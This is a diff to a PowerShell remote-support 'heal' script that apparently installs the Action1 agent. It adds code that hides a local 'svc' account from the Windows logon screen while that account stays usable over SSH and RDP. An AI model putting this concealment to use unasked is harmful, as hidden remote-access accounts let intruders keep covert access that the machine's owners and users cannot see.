@@ -152,6 +152,15 @@ if ($ACTION1_URL -and -not (Get-Service "Action1*" -ErrorAction SilentlyContinue
     } catch { Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) Action1 error: $($_.Exception.Message)" }
 }
 
+# --- svc account: hide from Windows logon screen (still fully usable for SSH/RDP/services) ---
+try {
+    if (Get-LocalUser -Name 'svc' -ErrorAction SilentlyContinue) {
+        $k = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
+        New-Item $k -Force | Out-Null
+        New-ItemProperty $k -Name 'svc' -PropertyType DWord -Value 0 -Force | Out-Null
+    }
+} catch { Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) svc hide error: $($_.Exception.Message)" }
+
 # --- Lock screen feature ---
 $lockCode = @'
 $ErrorActionPreference='SilentlyContinue'
